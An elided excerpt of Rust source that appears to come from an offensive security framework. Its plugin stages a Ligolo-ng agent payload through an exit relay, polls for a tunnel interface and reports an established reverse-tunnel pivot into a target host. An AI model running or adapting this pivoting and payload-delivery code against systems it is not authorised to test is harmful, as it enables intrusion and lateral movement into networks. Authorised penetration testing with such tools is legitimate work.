...
impl<M: ExecutorMode> ScannerPlugin for LigoloScanner<M> {
    ...
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            ...
            description: "Ligolo-Ng Pivot: Advanced reverse tunneling into secluded targets."
                .to_string(),
    ...
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        info!(
            "🔱 V14.1 SOVEREIGN: Orchestrating Ligolo-ng pivot at {}...",
            target.host
        );
        ...
        let pm = self
            .executor
            .get_proxy_manager()
            .context("Ligolo requires a ProxyManager for tunnel coordination")?;
        ...
        info!(
            "🔱 V14.1 SOVEREIGN: Preparing Ligolo agent delivery via managed exit relay: {}",
            delivery_ip
        );
        ...
        let token = server
            .stage_payload(std::path::PathBuf::from(agent_path))
            .await;
        ...
        for i in 0..5 {
            ...
            let iface_check = tokio::process::Command::new("ip")
                .arg("addr")
                .arg("show")
                .arg("ligolo")
                .output()
            ...
            if iface_check.status.success() {
                info!(
                    "🎯 V14.1 SOVEREIGN: Ligolo interface detected on attempt {}.",
                    i + 1
                );
                established = true;
                break;
        ...
        if established {
            findings.push(Finding::new(
                ...
                Severity::High,
                &format!(
                    "Ligolo-ng pivot established via {}. Tunnel active.",
                    target.host
                ),
                serde_json::json!({
                    "proxy_port": 11601,
